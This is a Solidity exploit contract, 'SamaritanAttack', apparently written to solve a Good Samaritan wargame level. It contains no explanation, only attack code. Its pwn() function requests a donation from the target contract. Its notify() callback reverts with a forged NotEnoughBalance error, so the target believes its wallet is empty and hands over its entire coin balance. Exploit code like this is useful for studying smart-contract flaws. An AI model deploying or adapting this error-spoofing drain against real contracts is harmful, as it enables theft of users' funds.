// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGood {
    function coin() external view returns (address);
    function requestDonation() external returns (bool enoughBalance);

}
interface ICoin {
    function balances(address) external view returns (uint256);
}

import "@openzeppelin/contracts/access/Ownable.sol";
import "hardhat/console.sol";

contract SamaritanAttack is Ownable {
    IGood public target;
    ICoin public coin;

    uint256 mybalance;

    error NotEnoughBalance();

    constructor(address _owner, address _target, address _coin) Ownable(_owner) {
        target = IGood(_target);
        coin = ICoin(_coin);
    }

    function pwn() external {
        target.requestDonation();
        mybalance = coin.balances(address(this));
        require(mybalance == 10**6, "hack failed");
    }

    function notify(uint256 _amount) external {
        if (_amount == 10) {
            revert NotEnoughBalance();
        }
    }

}